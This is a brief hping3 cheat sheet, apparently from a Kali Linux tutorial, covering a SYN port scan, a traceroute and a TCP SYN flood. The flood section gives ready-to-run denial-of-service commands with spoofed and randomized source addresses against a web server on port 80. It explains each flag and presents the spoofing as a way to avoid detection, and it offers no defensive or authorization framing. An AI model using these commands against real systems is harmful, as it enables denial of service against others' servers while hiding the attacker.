#### Port Scanning
**sudo hping3 -S <ip_address> -p <port> -c <number_of_packets>**  

#### Traceroute using Hping3
This illustration is like popular utilities like tracert (windows) or traceroute (linux) who utilizes ICMP packets expanding each time in 1 its TTL value.  
**sudo hping3 --traceroute -V -1 <ip_address>**

  
#### Perform A TCP Syn Flood Attack With Kali Linux & Hping3
**1. sudo hping3 -a <FAKE IP> <target> -S -q -p 80 --faster**  
**2. Syntax - hping3 -c 15000 -d 120 -S -w 64 -p 80 --flood --rand-source 192.168.225.128**  
  
We’re sending 15000 packets (-c 15000) at a size of 120 bytes (-d 120) each. We’re specifying that the SYN Flag (-S) should be enabled, with a TCP window size of 64 (-w 64). To direct the attack to our victum’s HTTP web server we specify port 80 (-p 80) and use the --flood flag to send packets as fast as possible. As you’d expect, the --rand-source flag generates spoofed IP addresses to disguise the real source and avoid detection but at the same time stop the victim’s SYN-ACK reply packets from reaching the attacker.
